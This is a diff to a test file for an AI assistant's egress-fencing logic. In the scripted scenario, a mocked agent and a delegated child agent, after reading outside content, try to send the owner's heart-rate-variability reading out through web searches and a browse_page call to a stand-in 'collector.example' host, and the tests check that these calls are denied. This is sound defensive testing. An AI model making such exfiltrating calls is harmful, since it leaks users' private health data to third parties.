@@ -11,7 +11,8 @@ import { ensureSchema } from '../src/tracer/schema';
 // decimal so no timestamp the turn writes can hold it.
 const HRV = '67.4';
 const EVENT = 'Quarterly board call';
-const model = vi.hoisted(() => ({ requests: [] as LLMGatewayRequest['request'][], order: 'together' as 'together' | 'calendar_first' | 'health_first' | 'stated' }));
+const CHILD_TASK = 'Read tomorrow on my calendar and report the meetings.';
+const model = vi.hoisted(() => ({ requests: [] as LLMGatewayRequest['request'][], order: 'together' as 'together' | 'calendar_first' | 'health_first' | 'stated' | 'delegated' }));
 vi.mock('../src/channels/telegram-turn', async load => {
   const original = await load<typeof import('../src/channels/telegram-turn')>();
   const gateway = { async complete({ request }: LLMGatewayRequest) {
@@ -19,6 +20,14 @@ vi.mock('../src/channels/telegram-turn', async load => {
     const done = (text: string, tool_calls?: Array<{ call_id: string; name: string; arguments: string }>) => ({ ok: true as const, data: { model: request.model, text, ...(tool_calls ? { tool_calls } : {}), input_tokens: 1, output_tokens: 1, cache_read_input_tokens: 0, latency_ms: 0 } });
     if (request.response_format) return done(request.response_format.name === 'task_source_scope' ? '{"decision":"retain","sources":[]}' : '{"add":[],"corrections":[],"seen":[],"confirm":[],"dismiss":[],"forget_claims":[],"forget_nodes":[]}');
     const asked = String(request.messages.at(-1)?.content ?? '').split('\n\n[memory recalled for this message')[0]!;
+    // A child the parent spawned after reading the reading: its first search brings in outside content, then it is steered to
+    // search again with the reading.
+    if (asked.includes(CHILD_TASK)) {
+      const child = request.tool_turns?.length ?? 0;
+      return child === 0 ? done('', [{ call_id: 'child-read', name: 'web_search', arguments: JSON.stringify({ query: 'board meeting preparation' }) }])
+        : child === 1 ? done('', [{ call_id: 'child-search', name: 'web_search', arguments: JSON.stringify({ query: `what does an hrv of ${HRV} mean` }) }])
+        : done('Board call at nine.');
+    }
     if (!asked.includes('Plan tomorrow around my energy')) return done('Noted.');
     const health = { call_id: 'health-1', name: 'get_health', arguments: JSON.stringify({ signals: ['hrv'], from: '2026-10-12', to: '2026-10-12' }) };
     const calendar = { call_id: 'calendar-1', name: 'query_calendar', arguments: JSON.stringify({ date_range: { from: '2026-10-14T00:00:00Z', to: '2026-10-15T00:00:00Z' } }) };
@@ -27,6 +36,8 @@ vi.mock('../src/channels/telegram-turn', async load => {
       { call_id: 'search-1', name: 'web_search', arguments: JSON.stringify({ query: `what does an hrv of ${HRV} mean` }) },
       { call_id: 'page-1', name: 'browse_page', arguments: JSON.stringify({ url: `https://collector.example/?v=${HRV}` }) },
     ];
+    const delegate = { call_id: 'delegate-1', name: 'delegate_task', arguments: JSON.stringify({ task: CHILD_TASK }) };
+    if (model.order === 'delegated') return [done('', [health]), done('', [delegate])][request.tool_turns?.length ?? 0] ?? done('Light morning, board call at nine.');
     const steps = { together: [[health, calendar]], calendar_first: [[calendar], [health]], health_first: [[health], [calendar]], stated: [[calendar]] }[model.order];
     const rounds = request.tool_turns?.length ?? 0;
     let at = 0;
@@ -135,6 +146,36 @@ it("a reading the owner states in the message fences the turn after an outside r
       for (const name of ['web_search', 'browse_page']) expect(turns.find(turn => turn.call.name === name)!.output).toContain('"error_code":"egress_denied"');
       expect(egressCalls).toEqual([]);
       expect(replyRequests().filter(request => request.web_search !== undefined)).toEqual([]);
+    } finally { vi.useRealTimers(); quiet.mockRestore(); await state.storage.deleteAlarm(); }
+  });
+});
+
+// The parent reads the reading, then hands a task to a child, whose brief it wrote after seeing it. The child starts with the
+// parent's mark, so once a read brings it outside content, its next search is refused like the parent's would be.
+it("a child spawned after the parent read the reading fences its own egress once it reads outside content", async () => {
+  const name = 'health-plan-external-delegated';
+  model.order = 'delegated';
+  await runInDurableObject(env.OWNER_DO!.get(env.OWNER_DO!.idFromName(name)), async (_instance, state) => {
+    claimStore(state.storage.sql); ensureSchema(state.storage);
+    state.storage.kv.put('do_name', name);
+    await state.storage.put('origin', 'https://fixture.invalid');
+    await state.storage.put('google:accounts', [{ id: 'local:owner@example.test', email: 'owner@example.test', refresh_token: 'synthetic-offline-only', scopes: ['https://www.googleapis.com/auth/calendar.events'] }]);
+    vi.setSystemTime('2026-10-13T06:30:00Z');
+    const quiet = vi.spyOn(console, 'error').mockImplementation(() => undefined);
+    const owner = new OwnerDO(state, { ...env, ...directory, ...google, TELEGRAM_BOT_TOKEN: undefined, OPENAI_API_KEY: 'synthetic-fixture', WALDO_OWNER_TIMEZONE: 'UTC', WALDO_OWNER_TELEGRAM_ID: undefined });
+    try {
+      const sent = await owner.fetch(new Request('https://telegram-owner/app/v1/chat/main/messages', { method: 'POST', headers: headers(name), body: JSON.stringify({ client_message_id: 'plan-delegated-client-01', text: 'Plan tomorrow around my energy: what should I do when, given my calendar?' }) }));
+      const { message_id: id } = await sent.json() as { message_id: string };
+      const settled = () => state.storage.kv.get<{ state: string }>(`app:inbox-record:${id}`)?.state;
+      await vi.waitFor(() => expect(['completed', 'interrupted']).toContain(settled()), { timeout: 10_000, interval: 20 });
+      expect(settled()).toBe('completed');
+      const child = model.requests.filter(request => String(request.messages.at(-1)?.content ?? '').includes(CHILD_TASK)).at(-1)!;
+      const turns = child.tool_turns ?? [];
+      expect(turns.map(turn => turn.call.name)).toEqual(['web_search', 'web_search']);
+      expect(turns[0]!.source_taint).toBe('external');
+      expect(turns[0]!.output).not.toContain('egress_denied');
+      expect(turns[1]!.output).toContain('"error_code":"egress_denied"');
+      expect(egressCalls).toEqual([]);
     } finally { vi.useRealTimers(); quiet.mockRestore(); await state.storage.deleteAlarm(); }
   });
 });
